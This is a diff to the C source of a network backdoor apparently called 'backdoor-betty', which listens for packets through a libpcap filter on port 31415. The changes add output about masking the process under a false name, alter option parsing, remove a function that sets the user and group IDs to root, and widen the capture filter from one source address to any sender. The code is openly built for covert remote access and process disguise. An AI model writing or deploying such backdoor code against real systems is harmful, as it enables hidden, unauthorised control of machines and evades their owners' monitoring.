@@ -17,6 +17,7 @@
  *----------------------------------------------------------------------------*/
 
 #include "backdoor-betty.h"
+#include "utils.h"
 #include "pkt_cap.h"
 
 /*-----------------------------------------------------------------------------
@@ -101,6 +102,7 @@ void print_settings(char *command)
 		fprintf(stderr, "  Running as daemon:   TRUE\n");
 	else
 		fprintf(stderr, "  Running as daemon:   FALSE\n");
+		fprintf(stderr, "  Masking process as:  %s\n", PROCESS_NAME);
 }
 
 /*-----------------------------------------------------------------------------
@@ -175,7 +177,7 @@ int parse_options(int argc, char *argv[])
 
 	/* parse options */
 	while (TRUE) {
-		c = getopt_long(argc, argv, "d:h", long_options, &option_index);
+		c = getopt_long(argc, argv, "dh", long_options, &option_index);
 
 		if (c == -1)
 			break;
@@ -248,15 +250,6 @@ void daemonize()
 		exit(ERROR_NONE);
 }
 
-int set_root()
-{
-	/* change the UID/GIT to 0 (root) */
-	if (setuid(0) != ERROR_NONE || setgid(0) != ERROR_NONE)
-		return ERROR_NOTROOT;
-
-	return ERROR_NONE;
-}
-
 void mask_process(char *argv[], char *name)
 {
 	memset(argv[0], 0, strlen(argv[0]));
@@ -272,7 +265,7 @@ void start_server()
 	bpf_u_int32 mask;					/* subnet mask */
 	bpf_u_int32 net;					/* ip address */
 
-	char filter_exp[] = "src 192.168.1.101 and dst port 31415";
+	char filter_exp[] = "dst port 31415";
 	struct bpf_program fp;				/* compiled filter program */
 
 	/* find a capture device */
